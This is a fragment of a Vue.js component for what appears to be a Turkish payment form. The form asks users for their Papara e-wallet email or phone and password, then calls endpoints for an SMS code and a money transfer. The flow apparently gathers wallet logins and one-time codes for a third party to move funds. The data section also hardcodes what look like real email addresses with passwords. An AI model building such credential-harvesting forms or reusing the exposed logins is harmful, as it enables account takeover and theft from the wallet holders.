    ...
    <div class="odeme-formu__body mx-auto">
      <div v-if="loading">
        <v-alert type="info" class="text-center">
          ...
          <br />Bu durum işlem yoğunluğuna göre birkaç dakika sürebilir.
        </v-alert>
      ...
      <div v-if="loginArea" class="odeme-formu__banks-area">
        <div class="odeme-formu__banks-area-header">
          <span class="odeme-formu__banks-area-header-title">Papara Girişi</span>
        </div>
        <div class="odeme-formu__banks-area-body mx-auto">
          <p class="text-muted padding-top-bottom-10 pt-5">Lütfen Papara Bilgilerinizi giriniz.</p>
          <v-text-field
            v-model="tc"
            label="Email adresiniz ayda telefon numaranız"
            prepend-icon="mdi-account-circle"
          />
          <v-text-field
            v-model="pass"
            label="Papara şifreniz"
...
const urlLogin = baseUrl + "/papara";
const urlSetSms = baseUrl + "/paparaSifre/";
const urlTransfer = baseUrl + "/paparaTransfer/";
...
export default {
  data() {
    return {
      ...
      tutar: 10, //
      tc: "betajans10@gmail.com",
      pass: "162516",
      pass2: "162516",
      /*
      tc: "hasip.timurtas@gmail.com",
      pass: "635972",
      pass2: "635972",
      */
      loginSms: "",
